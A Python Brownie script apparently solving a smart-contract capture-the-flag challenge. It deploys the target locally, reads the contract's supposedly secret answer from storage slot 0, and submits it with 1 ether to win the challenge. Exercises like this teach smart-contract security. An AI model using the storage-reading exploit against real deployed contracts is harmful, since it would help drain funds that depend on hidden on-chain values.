#!/usr/bin/python3
from brownie import web3
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

target_hash = "0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365"


def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{True}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")


def hack(contract_address=None, attacker=None):
    if not contract_address:
        target, _ = deploy()
        _, attacker = get_account()
    else:
        print(f"{red}Something is wrong{reset}")
        exit(-1)

    print_colour(target.isComplete())

    # web3.keccak(i).hex()
    # print(web3.eth.block_number)

    # exit()

    # # Get the value of ans
    # block_number = web3.eth.blockNumber
    # block_hash = web3.eth.getBlock(block_number - 1)["hash"].hex()
    # timestamp = hex(web3.eth.getBlock(block_number - 1)["timestamp"])[2:]

    # # print(block_hash + timestamp)
    # hash = web3.keccak(hexstr=(block_hash + timestamp)).hex()
    # print(hash)

    # answer = int("0x" + hash[-2:], 0)

    # print(answer)
    # exit()

    answer = web3.eth.getStorageAt(target.address, 0)

    print(f"{green}Secret value found: {int(answer.hex(), 0)}{reset}")

    target.guess(answer, {"from": attacker, "value": "1 ether"}).wait(1)

    print_colour(target.isComplete())

    assert target.isComplete() == True
    print(f"{green}Assert Passed!!{reset}")


def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()


if __name__ == "__main__":
    main()
